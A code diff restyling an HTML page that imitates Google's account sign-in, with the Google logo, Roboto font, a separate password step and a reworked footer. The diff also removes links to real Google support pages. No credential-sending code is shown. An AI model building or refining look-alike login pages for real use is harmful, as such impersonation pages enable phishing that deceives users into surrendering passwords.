@@ -4,11 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign In - Google account</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap" rel="stylesheet">
     <style>
         body {
             background-color: #1e1f20;
             color: black;
-            font-family: Arial, sans-serif;
+            font-family: 'Roboto', sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -53,19 +54,21 @@
             margin-right: 10px;
         }
         .text {
-            font-size: 18px;
-            margin-top: 60px;
-            text-color: #e4e4e3;
+            font-size: 24px;
+            font-weight: 500; /* Using Roboto Medium */
+            margin-top: 20px;
+            margin-left: 5px;
         }
         .input-box {
             width: 100%;
             padding: 10px;
             margin-top: 15px;
-            border: 2px solid #333; /* Just a border */
+            border: 2px solid #333; /* Same color as container */
+            background-color: #0e0e0e;
             color: white;
             border-radius: 5px;
             font-size: 16px;
-            height: 40px; /* Make the input field taller */
+            height: 40px;
         }
         .link {
             color: #8ab4f8;
@@ -73,8 +76,8 @@
             font-size: 14px;
         }
         .forgot-email-link {
-            align-self: flex-start; /* Align the "Forgot email?" link to the left */
-            margin-top: -10px; /* Adjust the vertical positioning */
+            align-self: flex-start;
+            margin-top: -10px;
         }
         .btn-container {
             display: flex;
@@ -90,7 +93,7 @@
             border-radius: 20px;
             cursor: pointer;
             font-size: 16px;
-            margin-left: 50px;
+            margin-left: 10px;
         }
         .footer {
             margin-top: 20px;
@@ -98,22 +101,31 @@
             text-align: center;
             color: white;
             width: 100%;
+            display: flex;
+            justify-content: space-between;
+            position: absolute;
+            bottom: 10px;
         }
         .footer a {
             color: white;
             text-decoration: none;
             margin: 0 10px;
         }
+        .footer .right {
+            margin-left: auto;
+        }
         /* Password Page Styling */
         #passwordPage {
             display: none;
-            background-color: #1e1f20;
+            background-color: #0e0e0e;
             color: white;
-            padding: 50px;
-            border-radius: 12px;
-            width: 350px;
-            height: 380px;
-            text-align: left;
+            padding: 30px;
+            border-radius: 25px;
+            width: 1000px;
+            height: 360px;
+            display: flex;
+            justify-content: space-between;
+            position: relative;
         }
         .password-box {
             width: 100%;
@@ -124,6 +136,7 @@
             border-radius: 5px;
             font-size: 16px;
             margin-top: 20px;
+            height: 40px;
         }
     </style>
 </head>
@@ -155,19 +168,31 @@
 
     <!-- Password Page -->
     <div class="container" id="passwordPage">
-        <h2>Enter your password</h2>
-        <input type="password" id="passwordInput" class="password-box" placeholder="Password">
-        <br>
-        <div class="btn-container">
-            <button class="btn" onclick="submitPassword()">Sign In</button>
+        <div class="left-section">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/42/Google_2015_logo.svg" alt="Google Logo">
+            </div>
+            <div class="text">
+                <p>Enter your password</p>
+            </div>
+        </div>
+
+        <div class="right-section">
+            <input type="password" id="passwordInput" class="password-box" placeholder="Password">
+            <br>
+            <div class="btn-container">
+                <button class="btn" onclick="submitPassword()">Sign In</button>
+            </div>
         </div>
     </div>
 
     <div class="footer">
-        <a href="#" onclick="changeLanguage()">English (United Kingdom)</a> | 
-        <a href="#" onclick="openHelpPage()">Help</a> | 
-        <a href="#" onclick="openPrivacyPage()">Privacy</a> | 
-        <a href="#" onclick="openTermsPage()">Terms</a>
+        <a href="#">Help</a> | 
+        <a href="#">Privacy</a> | 
+        <a href="#">Terms</a>
+        <div class="right">
+            <a href="#">English (United Kingdom)</a>
+        </div>
     </div>
 
     <script>
@@ -192,31 +217,6 @@
             } else {
                 alert("Incorrect password. Please try again.");
             }
-        }
-
-        // Footer link actions
-        function changeLanguage() {
-            alert("Redirecting to language settings...");
-            // You can redirect to another page using:
-            // window.location.href = "https://www.google.com/preferences";
-        }
-
-        function openHelpPage() {
-            alert("Redirecting to Help page...");
-            // Redirecting to Help page:
-            window.open("https://support.google.com", "_blank");
-        }
-
-        function openPrivacyPage() {
-            alert("Redirecting to Privacy page...");
-            // Redirecting to Privacy page:
-            window.open("https://policies.google.com/privacy", "_blank");
-        }
-
-        function openTermsPage() {
-            alert("Redirecting to Terms page...");
-            // Redirecting to Terms page:
-            window.open("https://policies.google.com/terms", "_blank");
         }
     </script>
 </body>
